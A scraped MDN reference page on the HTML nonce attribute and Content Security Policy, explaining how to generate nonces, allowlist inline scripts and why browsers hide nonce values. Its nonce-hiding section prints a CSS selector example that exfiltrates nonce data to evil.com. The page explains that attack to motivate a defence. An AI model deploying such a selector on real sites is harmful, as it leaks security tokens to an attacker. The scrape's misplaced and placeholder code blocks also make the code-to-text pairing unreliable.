SOURCE URL: https://developer.mozilla.org/docs/Web/HTML/Global_attributes/nonce
SCRAPED: 2025-06-19 18:04:51
================================================================================

--- CODE BLOCK 3 ---
unsafe-inline
--- END CODE BLOCK ---
global attribute
is a content attribute defining a cryptographic nonce ("number used once") which can be used by
Content Security Policy
to determine whether or not a given fetch will
be allowed to proceed for a given element.
Description
--- CODE BLOCK 6 ---
import crypto from "node:crypto";
crypto.randomBytes(16).toString("base64");
// '8IBTHwOdqNKAWeKl7plt8g=='
--- END CODE BLOCK ---
attribute is useful to allowlist specific elements, such as a particular inline script or style elements.
It can help you to avoid using the
--- CODE BLOCK 7 ---
import crypto from "node:crypto";
crypto.randomBytes(16).toString("base64");
// '8IBTHwOdqNKAWeKl7plt8g=='
--- END CODE BLOCK ---
directive, which would allowlist
inline scripts or styles.
Note:
Only use
--- CODE BLOCK 8 ---
<script nonce="8IBTHwOdqNKAWeKl7plt8g==">
// …
</script>
--- END CODE BLOCK ---
for cases where you have no way around using unsafe inline script
or style contents. If you don't need
--- CODE BLOCK 9 ---
<script nonce="8IBTHwOdqNKAWeKl7plt8g==">
// …
</script>
--- END CODE BLOCK ---
, don't use it. If your script is static, you could also use a CSP hash instead.
(See usage notes on
unsafe inline script
Always try to take full advantage of
protections and avoid nonces or unsafe inline scripts whenever possible.
Using nonce to allowlist a <script> element
There are a few steps involved to allowlist an inline script using the nonce mechanism:
Generating values
From your web server, generate a random base64-encoded string of at least 128 bits of data from a cryptographically secure
random number generator. Nonces should be generated differently each time the page loads (nonce only once!). For example, in nodejs:
Copy to Clipboard
--- CODE BLOCK 10 ---
Content-Security-Policy
--- END CODE BLOCK ---
Allowlisting inline script
The nonce generated on your backend code should now be used for the inline script that you'd like to allowlist:
html
Copy to Clipboard
--- CODE BLOCK 13 ---
Content-Security-Policy: script-src 'nonce-8IBTHwOdqNKAWeKl7plt8g=='
--- END CODE BLOCK ---
Sending a nonce with a CSP header
Finally, you'll need to send the nonce value in a
--- CODE BLOCK 16 ---
script.getAttribute("nonce"); // returns empty string
--- END CODE BLOCK ---
header
(prepend
--- CODE BLOCK 18 ---
script.nonce; // returns nonce value
--- END CODE BLOCK ---
http
Copy to Clipboard
--- CODE BLOCK 19 ---
script.nonce; // returns nonce value
--- END CODE BLOCK ---
Accessing nonces and nonce hiding
For security reasons, the
--- CODE BLOCK 21 ---
script[nonce~="whatever"] {
background: url("https://evil.com/nonce?whatever");
--- END CODE BLOCK ---
content attribute is hidden (an empty string will be returned).
Copy to Clipboard
--- CODE BLOCK 22 ---
HTMLElement.nonce
--- END CODE BLOCK ---
[CODE_BLOCK_17]
property is the only way to access nonces:
Copy to Clipboard
[CODE_BLOCK_18]
Nonce hiding helps prevent attackers from exfiltrating nonce data via mechanisms that can grab data
from content attributes like this:
Copy to Clipboard
[CODE_BLOCK_20]
Specifications
Specification
HTML
attr-nonce
Browser compatibility
See also
[CODE_BLOCK_22]
Content Security Policy
CSP:
[CODE_BLOCK_23]
Help improve MDN
Was this page helpful to you?
Learn how to contribute
This page was last modified on
Jun 6, 2025
MDN contributors
View this page on GitHub
Report a problem with this content